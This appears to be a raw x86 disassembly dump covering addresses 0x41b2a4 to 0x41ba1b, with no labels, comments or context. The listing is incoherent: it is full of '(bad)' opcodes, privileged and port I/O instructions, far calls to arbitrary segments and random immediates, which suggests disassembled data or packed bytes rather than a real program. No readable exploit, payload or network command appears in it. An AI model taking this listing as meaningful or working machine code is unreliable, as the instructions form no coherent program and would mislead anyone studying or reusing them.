  41b2a4:	sub    eax,0xa56eb03a
  41b2a9:	or     DWORD PTR [eax-0x506506c1],ecx
  41b2af:	cmp    eax,0x8149445f
  41b2b4:	lods   eax,DWORD PTR ds:[esi]
  41b2b5:	and    ah,dh
  41b2b7:	cs mov bh,0xb3
  41b2ba:	jg     0x41b26a
  41b2bc:	loopne 0x41b242
  41b2be:	(bad)  
  41b2bf:	out    dx,al
  41b2c0:	test   BYTE PTR [ecx+0xe],dl
  41b2c3:	call   0x602ed855
  41b2c8:	jns    0x41b270
  41b2ca:	repz mul ecx
  41b2cd:	js     0x41b322
  41b2cf:	icebp  
  41b2d0:	xor    ch,BYTE PTR [esi-0x2229546f]
  41b2d6:	jns    0x41b299
  41b2d8:	or     al,bh
  41b2da:	inc    eax
  41b2db:	bound  ecx,QWORD PTR [edi]
  41b2dd:	adc    eax,0xb1bd0d51
  41b2e2:	fisub  WORD PTR [ecx-0x4d]
  41b2e5:	ins    DWORD PTR es:[edi],dx
  41b2e6:	(bad)  
  41b2e7:	imul   eax,DWORD PTR [edi+eax*4],0x73
  41b2eb:	pop    ebp
  41b2ec:	dec    ebp
  41b2ed:	pop    edi
  41b2ee:	aaa    
  41b2ef:	sti    
  41b2f0:	mov    DWORD PTR [esi-0x2b3d5121],edi
  41b2f6:	xchg   edx,eax
  41b2f7:	jge    0x41b306
  41b2f9:	or     bh,ah
  41b2fb:	fisub  DWORD PTR [ebx-0x751853c1]
  41b301:	jmp    0x41b2ca
  41b303:	shl    DWORD PTR [eax],cl
  41b305:	adc    edx,ebp
  41b307:	and    al,0x72
  41b309:	pop    ebx
  41b30a:	xor    edi,DWORD PTR [ebx-0x55]
  41b30d:	push   cs
  41b30e:	cmp    ch,BYTE PTR [eax]
  41b310:	out    0x82,al
  41b312:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b313:	dec    esp
  41b314:	ret    
  41b315:	mov    ecx,0xde613884
  41b31a:	mov    esp,0x4ef280b0
  41b31f:	or     al,0xd6
  41b321:	imul   edi,DWORD PTR [esi-0x29],0x87b5b9b5
  41b328:	pop    esp
  41b329:	mov    bh,0x75
  41b32b:	xchg   esp,eax
  41b32c:	outs   dx,BYTE PTR ds:[esi]
  41b32d:	imul   ebp,DWORD PTR [ebx+0x70e857cb],0x2a
  41b334:	rcr    DWORD PTR [ecx-0x48],0x4f
  41b338:	jl     0x41b32c
  41b33a:	adc    eax,0x35886c0a
  41b33f:	and    ebx,ebp
  41b341:	lock xchg ebp,eax
  41b343:	sub    al,BYTE PTR [ebx]
  41b345:	inc    esp
  41b346:	(bad)  
  41b347:	adc    eax,0x3cb6d25d
  41b34c:	mov    ds,WORD PTR [ebp+0x4a]
  41b34f:	and    eax,0x970f4813
  41b354:	push   edx
  41b355:	sub    dl,dl
  41b357:	mov    ch,0x8d
  41b359:	push   ss
  41b35a:	pop    esi
  41b35b:	push   0x48
  41b35d:	rcr    BYTE PTR [edx+0x7],0x5d
  41b361:	mov    esi,0x36ac799
  41b366:	(bad)  
  41b367:	in     eax,0x4
  41b369:	mov    al,0x34
  41b36b:	push   bx
  41b36d:	pop    ebp
  41b36e:	xlat   BYTE PTR ds:[ebx]
  41b36f:	jecxz  0x41b34f
  41b371:	nop
  41b372:	and    al,BYTE PTR [edx]
  41b374:	das    
  41b375:	rol    ah,0x36
  41b378:	jb     0x41b34e
  41b37a:	in     al,0xe6
  41b37c:	add    esp,DWORD PTR [edx-0x20]
  41b37f:	sar    edi,0x7d
  41b382:	cmp    BYTE PTR [ebp+0x42355c9d],bl
  41b388:	test   DWORD PTR [ebx+0x75],0xb5e1cb47
  41b38f:	sar    BYTE PTR [ebx+edi*4],1
  41b392:	test   BYTE PTR [ebx-0x23],cl
  41b395:	test   al,0x74
  41b397:	in     eax,0xbc
  41b399:	sbb    edx,DWORD PTR ss:[eax]
  41b39c:	stos   BYTE PTR es:[edi],al
  41b39d:	test   BYTE PTR [ecx],dl
  41b39f:	pop    es
  41b3a0:	push   esp
  41b3a1:	clc    
  41b3a2:	mov    es,WORD PTR [esi]
  41b3a4:	push   ebp
  41b3a5:	out    dx,eax
  41b3a6:	push   0x1a
  41b3a8:	add    al,0xa3
  41b3aa:	rdpmc  
  41b3ac:	inc    edi
  41b3ad:	stc    
  41b3ae:	gs inc ecx
  41b3b0:	repnz mov ds:0xac3ebd8f,eax
  41b3b6:	jae    0x41b35e
  41b3b8:	lea    ecx,[eax+ebp*1+0x59]
  41b3bc:	jle    0x41b388
  41b3be:	mov    BYTE PTR [eax],dh
  41b3c0:	jmp    0x41b428
  41b3c2:	xchg   DWORD PTR [eax],esp
  41b3c4:	mov    ah,0xf2
  41b3c6:	sub    eax,DWORD PTR [edx-0x7c1e3a7]
  41b3cc:	push   ds
  41b3cd:	sub    eax,0x1e0c4075
  41b3d2:	into   
  41b3d3:	js     0x41b411
  41b3d5:	cli    
  41b3d6:	pop    ds
  41b3d7:	mov    bh,0x39
  41b3d9:	sub    al,0xb3
  41b3db:	mov    ebx,ebp
  41b3dd:	cmp    eax,0x30a5ca1b
  41b3e2:	xor    dl,BYTE PTR [edx+eax*2]
  41b3e5:	lods   al,BYTE PTR ds:[esi]
  41b3e6:	shl    DWORD PTR [ebx+ecx*2],0xbb
  41b3ea:	or     DWORD PTR [eax-0x49],esi
  41b3ed:	popa   
  41b3ee:	leave  
  41b3ef:	or     eax,ecx
  41b3f1:	inc    ebx
  41b3f2:	(bad)  
  41b3f3:	sub    ch,BYTE PTR [esi-0x3d4566f3]
  41b3f9:	push   ebx
  41b3fa:	(bad)  
  41b3fb:	mov    DWORD PTR [ebx-0x4e],ebp
  41b3fe:	sbb    DWORD PTR [ebp+0x5c57bfb4],0x535ca756
  41b408:	js     0x41b460
  41b40a:	enter  0x6c9e,0x64
  41b40e:	adc    BYTE PTR [eax+0x5b],dl
  41b411:	stos   BYTE PTR es:[edi],al
  41b412:	in     eax,0xa8
  41b414:	scas   eax,DWORD PTR es:[edi]
  41b415:	int    0x89
  41b417:	mov    ds,WORD PTR [edi+0x5af785b4]
  41b41d:	inc    eax
  41b41e:	dec    ebp
  41b41f:	push   ecx
  41b420:	pop    esp
  41b421:	arpl   cx,si
  41b423:	cmp    al,0x2c
  41b425:	adc    esp,ecx
  41b427:	inc    ebx
  41b428:	xchg   ebp,eax
  41b429:	mov    al,ds:0x5831265b
  41b42e:	jmp    0x72d6cf9e
  41b433:	sbb    cl,cl
  41b435:	js     0x41b494
  41b437:	push   0x72
  41b439:	add    DWORD PTR [ebx-0x5f],esp
  41b43c:	mov    BYTE PTR es:[edi-0x37fb62ed],bl
  41b443:	xchg   ebx,eax
  41b444:	xchg   ebx,eax
  41b445:	mov    dh,BYTE PTR [eax+0x4c6d8c0]
  41b44b:	xor    DWORD PTR [ecx],esp
  41b44d:	stos   DWORD PTR es:[edi],eax
  41b44e:	stc    
  41b44f:	fisubr WORD PTR [edx+ebp*1+0x6f]
  41b453:	fst    DWORD PTR [edx-0x58]
  41b456:	adc    BYTE PTR [edx-0x1f],cl
  41b459:	data16 sar BYTE PTR [eax-0x124c2bf],1
  41b460:	add    BYTE PTR [esi-0x30c8eba5],ch
  41b466:	scas   eax,DWORD PTR es:[edi]
  41b467:	popf   
  41b468:	adc    eax,0x35e7086f
  41b46d:	xlat   BYTE PTR ds:[ebx]
  41b46e:	in     eax,dx
  41b46f:	aas    
  41b470:	imul   edx
  41b472:	scas   eax,DWORD PTR es:[edi]
  41b473:	dec    edi
  41b474:	retf   0xd6fc
  41b477:	pop    esp
  41b478:	loope  0x41b44e
  41b47a:	add    esp,edi
  41b47c:	cwde   
  41b47d:	fisttp WORD PTR [edx]
  41b47f:	out    0x21,al
  41b481:	xchg   DWORD PTR [ebx-0x2e],edi
  41b484:	aas    
  41b485:	nop
  41b486:	fist   DWORD PTR [eax]
  41b488:	(bad)  
  41b489:	or     al,0x7d
  41b48b:	(bad)  
  41b48c:	enter  0x43c4,0x8c
  41b490:	mov    ds:0x5f9e443,eax
  41b495:	sbb    esi,DWORD PTR [ebp-0x5d]
  41b498:	shr    DWORD PTR [esp+eiz*8],0x16
  41b49c:	inc    edx
  41b49d:	mov    edi,0x8ec24ed9
  41b4a2:	inc    eax
  41b4a3:	out    0x6f,eax
  41b4a5:	dec    ecx
  41b4a6:	xlat   BYTE PTR ds:[ebx]
  41b4a7:	push   esp
  41b4a8:	add    al,0x40
  41b4aa:	add    eax,0xe233ab9e
  41b4af:	retf   
  41b4b0:	xor    al,0x2e
  41b4b2:	push   es
  41b4b3:	push   edi
  41b4b4:	popf   
  41b4b5:	push   cs
  41b4b6:	lahf   
  41b4b7:	fwait
  41b4b8:	jge    0x41b474
  41b4ba:	cli    
  41b4bb:	int3   
  41b4bc:	std    
  41b4bd:	jbe    0x41b47e
  41b4bf:	or     eax,0x75356bfe
  41b4c4:	xor    DWORD PTR [eax],0x3e
  41b4c7:	or     ecx,ecx
  41b4c9:	jo     0x41b4ce
  41b4cb:	mov    ds:0xc1416743,eax
  41b4d0:	scas   al,BYTE PTR es:[edi]
  41b4d1:	fldcw  WORD PTR [eax+0x9]
  41b4d4:	test   ch,bl
  41b4d6:	fadd   QWORD PTR [ebp-0x63aa390d]
  41b4dc:	jb     0x41b52d
  41b4de:	shr    DWORD PTR [esi+esi*4],1
  41b4e1:	sub    eax,DWORD PTR [edi-0x26edfa6a]
  41b4e7:	push   ds
  41b4e8:	push   ebp
  41b4e9:	repz leave 
  41b4eb:	(bad)  
  41b4ed:	test   BYTE PTR [eax-0x5b205e8f],ch
  41b4f3:	sbb    DWORD PTR [bx],0x4042d4a8
  41b4fa:	in     eax,dx
  41b4fb:	jmp    edx
  41b4fd:	mov    ecx,0xb0e28bc
  41b502:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b503:	and    eax,0xc2501a88
  41b508:	mov    al,0x7
  41b50a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b50b:	cwde   
  41b50c:	mov    ds:0x45387217,eax
  41b511:	xchg   ebx,eax
  41b512:	sub    esi,DWORD PTR [eax]
  41b514:	adc    BYTE PTR [ebx-0x3e],ch
  41b517:	mov    ebx,edi
  41b519:	mov    bl,0x1e
  41b51b:	out    0xb3,eax
  41b51d:	sub    dl,BYTE PTR [esi-0x15]
  41b520:	ja     0x41b54e
  41b522:	fwait
  41b523:	sti    
  41b524:	les    ebx,FWORD PTR [eax-0x6a2db142]
  41b52a:	call   0xb56629b7
  41b52f:	cmp    edx,DWORD PTR [ebp+0x31]
  41b532:	cmp    BYTE PTR [edx-0x6e20ad75],dh
  41b538:	adc    ch,ah
  41b53a:	adc    ebx,DWORD PTR [ebp-0x3a]
  41b53d:	sbb    eax,DWORD PTR [esi+0x41]
  41b540:	sub    BYTE PTR [ecx+0x57c123d3],ch
  41b546:	aam    0x20
  41b548:	mov    ah,0x6e
  41b54a:	mov    dh,BYTE PTR [edx]
  41b54c:	pop    ecx
  41b54d:	push   edx
  41b54e:	cmp    BYTE PTR [ebx],dh
  41b550:	aad    0x84
  41b552:	dec    esp
  41b553:	sub    BYTE PTR [ebp+0x3a],0x8a
  41b557:	dec    ebx
  41b558:	out    0xb0,al
  41b55a:	sbb    esi,DWORD PTR [edi+0x55e7d173]
  41b560:	(bad)  
  41b561:	stc    
  41b562:	ss fucomp st(0)
  41b565:	dec    ecx
  41b566:	popf   
  41b567:	stos   DWORD PTR es:[edi],eax
  41b568:	je     0x41b524
  41b56a:	gs mov dh,0xda
  41b56d:	sub    al,0xcd
  41b56f:	(bad)  
  41b570:	cmc    
  41b571:	xor    bl,BYTE PTR [edx+0x17d3bca6]
  41b577:	or     ecx,edi
  41b579:	mov    ds:0x1f20dcaf,al
  41b57e:	lea    esp,[ebx+0x514dcf57]
  41b584:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b585:	mov    bl,0xdc
  41b587:	fld    QWORD PTR [ebp+0x88c99d4]
  41b58d:	xor    eax,0xcaefa82f
  41b592:	mov    bh,0x28
  41b594:	into   
  41b595:	sti    
  41b596:	test   eax,0x3ad6c65f
  41b59b:	fwait
  41b59c:	enter  0xa0fa,0xd0
  41b5a0:	mov    esp,0x483d9a74
  41b5a5:	ret    0x4758
  41b5a8:	fsub   DWORD PTR [esi+0x2a]
  41b5ab:	cs stos DWORD PTR es:[edi],eax
  41b5ad:	clc    
  41b5ae:	frstor [esi+0x7de241ef]
  41b5b4:	lahf   
  41b5b5:	addr16 or al,cl
  41b5b8:	scas   eax,DWORD PTR es:[edi]
  41b5b9:	out    dx,eax
  41b5ba:	call   0xcbed0235
  41b5bf:	or     esi,ebx
  41b5c1:	out    0xbe,eax
  41b5c3:	je     0x41b5b9
  41b5c5:	mov    cl,0x53
  41b5c7:	lock mov WORD PTR [edx+0x6a88d6b2],?
  41b5ce:	jb     0x41b5f1
  41b5d0:	xor    al,0x67
  41b5d2:	ja     0x41b62b
  41b5d4:	jno    0x41b59a
  41b5d6:	xor    DWORD PTR [eax+0x6],eax
  41b5d9:	adc    DWORD PTR [ebp-0x674923f9],edx
  41b5df:	aam    0x68
  41b5e1:	push   ebp
  41b5e2:	cmp    al,0x61
  41b5e4:	call   0xe6c3:0x2d09e901
  41b5eb:	mov    DWORD PTR [ecx-0x36],esi
  41b5ee:	jge    0x41b603
  41b5f0:	mov    al,ds:0x45710b39
  41b5f5:	mov    al,ds:0x7db07bb
  41b5fa:	xor    ecx,DWORD PTR [ebx]
  41b5fc:	(bad)  
  41b5fd:	aam    0x55
  41b5ff:	hlt    
  41b600:	mov    dl,dh
  41b602:	popa   
  41b603:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b604:	xor    BYTE PTR [eax-0x63ad70ef],ch
  41b60a:	and    BYTE PTR [eax+0x4d],ah
  41b60d:	sahf   
  41b60e:	sbb    eax,0x9dae4771
  41b613:	mov    ebp,0xe72d8cf0
  41b618:	jno    0x41b5a0
  41b61a:	aas    
  41b61b:	aas    
  41b61c:	data16 mov cl,0x5d
  41b61f:	pop    edx
  41b620:	mov    ds:0x91fc2424,eax
  41b625:	sar    DWORD PTR [edi+0x60],cl
  41b628:	push   0xc7b6b2f2
  41b62d:	mov    ch,0x2d
  41b62f:	retf   
  41b630:	and    eax,0xad70ed2
  41b635:	rcr    BYTE PTR [ebx+0x2d0ddd21],1
  41b63b:	add    al,0xda
  41b63d:	int    0x97
  41b63f:	stc    
  41b640:	mov    ebx,0xdad222f
  41b645:	xor    eax,0x8a0ca439
  41b64a:	mov    bh,0x8
  41b64c:	lods   eax,DWORD PTR ds:[esi]
  41b64d:	xor    DWORD PTR [ebx],esp
  41b64f:	mov    DWORD PTR [ecx+0x67],esi
  41b652:	xor    bh,BYTE PTR [eax]
  41b654:	into   
  41b655:	xchg   ecx,eax
  41b656:	mov    bl,BYTE PTR [esi+0x52]
  41b659:	sub    bl,BYTE PTR [ebp+0x6f]
  41b65c:	stos   BYTE PTR es:[edi],al
  41b65d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b65e:	push   esp
  41b65f:	arpl   WORD PTR [esi-0x56],di
  41b662:	(bad)  
  41b663:	push   edx
  41b664:	ret    
  41b665:	pushf  
  41b666:	pop    edx
  41b667:	push   edi
  41b668:	mov    al,0x41
  41b66a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b66b:	dec    ecx
  41b66c:	ror    DWORD PTR [esi+ebp*4],0x5f
  41b670:	lds    eax,FWORD PTR [eax]
  41b672:	xor    DWORD PTR [edx-0x7d],ebx
  41b675:	dec    ecx
  41b676:	std    
  41b677:	repz sbb edi,DWORD PTR [edi-0x749b5e83]
  41b67e:	fisttp DWORD PTR [ebx+0x22050068]
  41b684:	aad    0xd5
  41b686:	adc    al,0xaa
  41b688:	mov    bl,0x4
  41b68a:	sbb    eax,0x43506c96
  41b68f:	dec    ecx
  41b690:	arpl   WORD PTR [ecx],cx
  41b692:	dec    ecx
  41b693:	mov    ebx,0x3134315c
  41b698:	xchg   esp,eax
  41b699:	out    0xf8,eax
  41b69b:	icebp  
  41b69c:	adc    dh,cl
  41b69e:	pop    ecx
  41b69f:	or     al,0x2b
  41b6a1:	cmp    cl,al
  41b6a3:	call   0x7763:0xbcc4792a
  41b6aa:	mov    ebp,0xe6913c9e
  41b6af:	add    ebx,DWORD PTR [edx+eax*8-0x7eba2114]
  41b6b6:	jns    0x41b6a4
  41b6b8:	cmp    al,0x7d
  41b6ba:	pop    ebx
  41b6bb:	dec    eax
  41b6bc:	jns    0x41b6d1
  41b6be:	addr16 jl 0x41b702
  41b6c1:	and    eax,0xd5773e95
  41b6c6:	sbb    cl,ch
  41b6c8:	gs int 0xe1
  41b6cb:	in     al,dx
  41b6cc:	int3   
  41b6cd:	clc    
  41b6ce:	pop    DWORD PTR [esi+0x6f]
  41b6d1:	inc    edi
  41b6d2:	sti    
  41b6d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6d4:	cs cmp al,0xf5
  41b6d7:	jge    0x41b6ea
  41b6d9:	cmp    edi,DWORD PTR [ebp+0x60]
  41b6dc:	jae    0x41b729
  41b6de:	test   al,0xe2
  41b6e0:	push   0x279cfd2f
  41b6e5:	(bad)  
  41b6e6:	lock or dl,BYTE PTR [edi+0x37]
  41b6ea:	ins    BYTE PTR es:[edi],dx
  41b6eb:	or     al,0x71
  41b6ed:	jns    0x41b769
  41b6ef:	mov    cs,WORD PTR [eax+eax*8-0x40]
  41b6f3:	adc    al,bh
  41b6f5:	pop    ecx
  41b6f6:	pop    eax
  41b6f7:	mov    al,0x86
  41b6f9:	inc    esi
  41b6fa:	cld    
  41b6fb:	and    DWORD PTR [edi-0x2a],ecx
  41b6fe:	xlat   BYTE PTR ds:[ebx]
  41b6ff:	xchg   esi,eax
  41b700:	mov    ds:0xe07be3cf,al
  41b705:	jp     0x41b748
  41b707:	sbb    DWORD PTR [ebx],ebp
  41b709:	ror    ecx,cl
  41b70b:	inc    ch
  41b70d:	mov    ds:0xb1884b5c,eax
  41b712:	fwait
  41b713:	inc    edi
  41b714:	pop    ss
  41b715:	or     al,0xde
  41b717:	mov    BYTE PTR [ebp+eax*4+0x6d5ecfb8],ah
  41b71e:	(bad)  
  41b71f:	cli    
  41b720:	les    ebx,FWORD PTR [ebx-0x6f]
  41b723:	loopne 0x41b768
  41b725:	out    0xf1,al
  41b727:	loop   0x41b720
  41b729:	nop
  41b72a:	cli    
  41b72b:	(bad)  
  41b72c:	cmc    
  41b72d:	sub    bl,ch
  41b72f:	cmc    
  41b730:	adc    al,0xdb
  41b732:	aas    
  41b733:	add    edi,DWORD PTR [eax-0x5c30602a]
  41b739:	icebp  
  41b73a:	push   ebx
  41b73b:	sbb    eax,0xa947bf81
  41b740:	pop    eax
  41b741:	sbb    esp,DWORD PTR [ebx-0x1a83bd8]
  41b747:	xor    BYTE PTR [ebp-0x2f679279],ch
  41b74d:	aas    
  41b74e:	cs add eax,0x54763780
  41b754:	mov    ecx,0xc3d500ad
  41b759:	dec    ecx
  41b75a:	xor    ch,BYTE PTR [ecx+0x22]
  41b75d:	mov    dh,BYTE PTR [edi-0x5a61cf4a]
  41b763:	pop    es
  41b764:	(bad)  
  41b765:	lods   eax,DWORD PTR ds:[esi]
  41b766:	lea    ebp,[ebx]
  41b768:	sti    
  41b769:	inc    eax
  41b76a:	in     al,dx
  41b76b:	mov    ebx,0x73ba1662
  41b770:	or     cl,BYTE PTR [esi+0x7d688cce]
  41b776:	test   al,0x28
  41b778:	mov    esp,0xf7e5adf
  41b77d:	xlat   BYTE PTR ds:[ebx]
  41b77e:	js     0x41b7be
  41b780:	cld    
  41b781:	dec    ebp
  41b782:	push   es
  41b783:	xchg   ecx,eax
  41b784:	ret    
  41b785:	sbb    esp,DWORD PTR [edx]
  41b787:	aaa    
  41b788:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41b78a:	cmp    al,0x99
  41b78c:	or     al,0xe4
  41b78e:	adc    esp,ecx
  41b790:	lock std 
  41b792:	enter  0x11b,0xf1
  41b796:	(bad)  
  41b797:	stc    
  41b798:	pop    edx
  41b799:	or     ecx,DWORD PTR ss:[eax-0x76]
  41b79d:	jns    0x41b80f
  41b79f:	mov    DWORD PTR ds:0xba02e261,ebx
  41b7a5:	cdq    
  41b7a6:	cmp    DWORD PTR [ebx-0x396d52f8],ebp
  41b7ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7ad:	ds stos DWORD PTR es:[edi],eax
  41b7af:	push   0x66
  41b7b1:	push   0xfd46e634
  41b7b6:	out    dx,al
  41b7b7:	arpl   WORD PTR [edx+0x607662ba],ax
  41b7bd:	sbb    esp,DWORD PTR [edi]
  41b7bf:	xor    eax,0x223af717
  41b7c4:	loop   0x41b818
  41b7c6:	jns    0x41b760
  41b7c8:	jle    0x41b78b
  41b7ca:	adc    ecx,ecx
  41b7cc:	and    eax,0xe462b71f
  41b7d1:	lds    esi,FWORD PTR [ebp+0xe]
  41b7d4:	(bad)  
  41b7d5:	xchg   esp,eax
  41b7d6:	imul   DWORD PTR [eax]
  41b7d8:	sbb    eax,0x1840ff62
  41b7dd:	mov    ah,0xd9
  41b7df:	aam    0x21
  41b7e1:	mov    ecx,0x63ed44a5
  41b7e6:	repnz ss mov al,0xf
  41b7ea:	lea    ebx,[esi+eiz*1+0x29347353]
  41b7f1:	add    edx,DWORD PTR [esi-0x21]
  41b7f4:	popa   
  41b7f5:	(bad)  
  41b7f6:	push   ecx
  41b7f7:	xor    BYTE PTR [ebx+0x3],dh
  41b7fa:	mov    ch,0xa3
  41b7fc:	call   0x46d4:0x4c179e1b
  41b803:	mov    fs,WORD PTR [ebp-0x5e50e9d9]
  41b809:	push   cs
  41b80a:	shr    DWORD PTR [edx],0x34
  41b80d:	mov    dh,0x33
  41b80f:	xchg   ebx,eax
  41b810:	adc    eax,0x8d8ae671
  41b815:	dec    esp
  41b816:	aas    
  41b817:	pop    esi
  41b818:	mov    ecx,0xb9e8c123
  41b81d:	push   es
  41b81e:	shl    DWORD PTR [edi+0x453a3c2d],0x15
  41b825:	shl    BYTE PTR [ebx+0x39e944f6],1
  41b82b:	not    BYTE PTR [eax+0x111709c]
  41b831:	push   edx
  41b832:	pop    edi
  41b833:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b834:	xor    eax,0x666ba42f
  41b839:	test   al,0x35
  41b83b:	push   ds
  41b83c:	or     cl,BYTE PTR [ebx+0xbd8e9a3]
  41b842:	arpl   ax,dx
  41b844:	mov    al,ds:0xc1203ba
  41b849:	leave  
  41b84a:	mov    ds:0xb3cf2587,eax
  41b84f:	(bad)  
  41b850:	dec    ebp
  41b851:	cwde   
  41b852:	cmp    al,0x2f
  41b854:	loop   0x41b7db
  41b856:	pop    ds
  41b857:	xor    eax,0x6b130bd5
  41b85c:	cvtpi2ps xmm1,QWORD PTR [ebx+0x461359d4]
  41b863:	or     al,0xce
  41b865:	scas   al,BYTE PTR es:[edi]
  41b866:	cmp    eax,0xafab2cc7
  41b86b:	fnstsw WORD PTR [eax-0x4e50b189]
  41b871:	and    ecx,DWORD PTR [ebx+eiz*2]
  41b874:	bound  ebp,QWORD PTR [esp+ebp*2-0x16]
  41b878:	rcr    bl,cl
  41b87a:	xchg   edx,eax
  41b87b:	imul   eax,ebp,0xffffff9d
  41b87e:	mov    edx,0xb353e4d8
  41b883:	cmp    BYTE PTR [eax+0x5562ce4d],cl
  41b889:	cmp    DWORD PTR [edi-0x20],0x5c4fdb79
  41b890:	inc    ebp
  41b891:	mov    ecx,0x129a2496
  41b896:	js     0x41b8a5
  41b898:	scas   al,BYTE PTR es:[edi]
  41b899:	cld    
  41b89a:	enter  0x1499,0x3a
  41b89e:	aaa    
  41b89f:	fstp   QWORD PTR [edi]
  41b8a1:	rcr    ebp,cl
  41b8a3:	sbb    eax,0xb282ec17
  41b8a8:	std    
  41b8a9:	lea    esi,ds:0x94ff7b3c
  41b8af:	in     al,0x62
  41b8b1:	cs pushf 
  41b8b3:	aad    0xc0
  41b8b5:	adc    edx,DWORD PTR [ebx]
  41b8b7:	xchg   edi,eax
  41b8b8:	imul   esp,esp,0x658ccffd
  41b8be:	js     0x41b90e
  41b8c0:	adc    BYTE PTR [esi+0x1d07298a],0x53
  41b8c7:	test   ah,0xba
  41b8ca:	mov    ecx,0x445a5e9a
  41b8cf:	adc    al,0x8
  41b8d1:	into   
  41b8d2:	mov    al,0x98
  41b8d4:	dec    edx
  41b8d5:	sbb    DWORD PTR [eax-0x3ed78b1d],esi
  41b8db:	push   ss
  41b8dc:	sub    eax,0x3dea1258
  41b8e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8e2:	aam    0x19
  41b8e4:	js     0x41b946
  41b8e6:	mov    edi,cr4
  41b8e9:	outs   dx,DWORD PTR ds:[esi]
  41b8ea:	test   BYTE PTR [edx-0x17325dfe],bh
  41b8f0:	mov    ebp,0x2edba8c9
  41b8f5:	cld    
  41b8f6:	fbld   TBYTE PTR [ecx+esi*2]
  41b8f9:	rcr    BYTE PTR [edx-0x7],cl
  41b8fc:	jne    0x41b978
  41b8fe:	fstp   st(1)
  41b900:	rcl    BYTE PTR [edx+0x20],1
  41b903:	lods   eax,DWORD PTR ds:[esi]
  41b904:	lea    ebp,[ecx+eiz*8]
  41b907:	(bad)  
  41b908:	enter  0x87fe,0xb0
  41b90c:	sbb    cl,BYTE PTR [edx+0xab3bd25]
  41b912:	es mov dl,0xe3
  41b915:	adc    esp,DWORD PTR ss:[esi-0x59071736]
  41b91c:	fwait
  41b91d:	dec    eax
  41b91e:	mov    cl,0xfd
  41b920:	push   es
  41b921:	push   ebx
  41b922:	inc    edx
  41b923:	adc    BYTE PTR [edi],dh
  41b925:	ds jb  0x41b963
  41b928:	inc    ecx
  41b929:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b92a:	es jecxz 0x41b9a5
  41b92d:	cmp    DWORD PTR fs:[edx],ecx
  41b930:	(bad)  
  41b932:	cdq    
  41b933:	push   ebp
  41b934:	jecxz  0x41b8be
  41b936:	jg     0x41b921
  41b938:	fcomip st,st(5)
  41b93a:	jmp    0x41b933
  41b93c:	mov    bl,0x56
  41b93e:	cmc    
  41b93f:	in     al,0xe3
  41b941:	pop    esi
  41b942:	lods   al,BYTE PTR ds:[esi]
  41b943:	sbb    DWORD PTR [edx-0x80],ebx
  41b946:	jbe    0x41b98f
  41b948:	(bad)  
  41b949:	push   cs
  41b94a:	mov    cl,0x1
  41b94c:	lahf   
  41b94d:	in     al,0x94
  41b94f:	sbb    BYTE PTR [ebx+ebp*2],al
  41b952:	xor    dh,bl
  41b954:	(bad)  ss:[edi+esi*8-0x37]
  41b959:	sahf   
  41b95a:	and    ebp,DWORD PTR [esi]
  41b95c:	jns    0x41b91f
  41b95e:	dec    esp
  41b95f:	scas   al,BYTE PTR es:[edi]
  41b960:	jge    0x41b956
  41b962:	dec    eax
  41b963:	out    0x82,al
  41b965:	cmc    
  41b966:	ror    DWORD PTR [edi],cl
  41b968:	jg     0x41b9c8
  41b96a:	mov    dl,0x84
  41b96c:	mov    ebx,0xab028d64
  41b971:	xchg   ecx,eax
  41b972:	in     eax,0xec
  41b974:	daa    
  41b975:	lock adc eax,0x7fe285e0
  41b97b:	mov    esp,0x5ba6f013
  41b980:	xchg   edi,eax
  41b981:	or     ebx,DWORD PTR [ecx+0x4d10b424]
  41b987:	and    dl,ch
  41b989:	dec    ebp
  41b98a:	jno    0x41b933
  41b98c:	daa    
  41b98d:	add    BYTE PTR ds:0x9c7faae9,bl
  41b993:	retf   
  41b994:	out    dx,al
  41b995:	arpl   WORD PTR [esp+eiz*2],dx
  41b998:	jecxz  0x41b9a1
  41b99a:	pop    edx
  41b99b:	xor    BYTE PTR [esi+eiz*4],0x93
  41b99f:	xor    ebp,DWORD PTR [bp-0x2321]
  41b9a4:	ss or  ecx,esi
  41b9a7:	cwde   
  41b9a8:	mov    ?,ebp
  41b9aa:	fsubr  DWORD PTR [edx]
  41b9ac:	xchg   DWORD PTR [ecx+ebx*1+0x4a],ecx
  41b9b0:	mov    ecx,esi
  41b9b2:	outs   dx,DWORD PTR ds:[esi]
  41b9b3:	test   al,0x54
  41b9b5:	pop    esp
  41b9b6:	pop    ds
  41b9b7:	add    ebp,DWORD PTR [edx-0x4887328c]
  41b9bd:	iret   
  41b9be:	cmp    ch,bh
  41b9c0:	dec    ebp
  41b9c1:	out    dx,eax
  41b9c2:	les    edx,FWORD PTR [esi+0x78]
  41b9c5:	mov    BYTE PTR [edi+0x5798ab60],al
  41b9cb:	nop
  41b9cc:	fimul  DWORD PTR [edx-0x4cf64d50]
  41b9d2:	mov    bl,0x83
  41b9d4:	div    BYTE PTR [ebp+edi*4+0x21]
  41b9d8:	call   0x5731:0x908ce7a7
  41b9df:	xchg   esi,eax
  41b9e0:	(bad)  
  41b9e1:	(bad)  
  41b9e3:	cwde   
  41b9e4:	(bad)  
  41b9e6:	fcomp  QWORD PTR [ebx-0x624bb371]
  41b9ec:	iret   
  41b9ed:	lock bound ebp,QWORD PTR [ebx-0x7b8a20fb]
  41b9f4:	enter  0x201e,0x9d
  41b9f8:	jne    0x41ba63
  41b9fa:	jp     0x41b999
  41b9fc:	and    eax,0xe821ec0d
  41ba01:	ja     0x41ba74
  41ba03:	inc    edi
  41ba04:	pop    ds
  41ba05:	or     dl,BYTE PTR [esi+edx*4+0x23]
  41ba09:	cmp    ecx,ecx
  41ba0b:	and    eax,0x1135ce80
  41ba10:	mov    ds:0x603980b9,al
  41ba15:	inc    BYTE PTR [esi+0x1777d97f]
  41ba1b:	je     0x41ba22
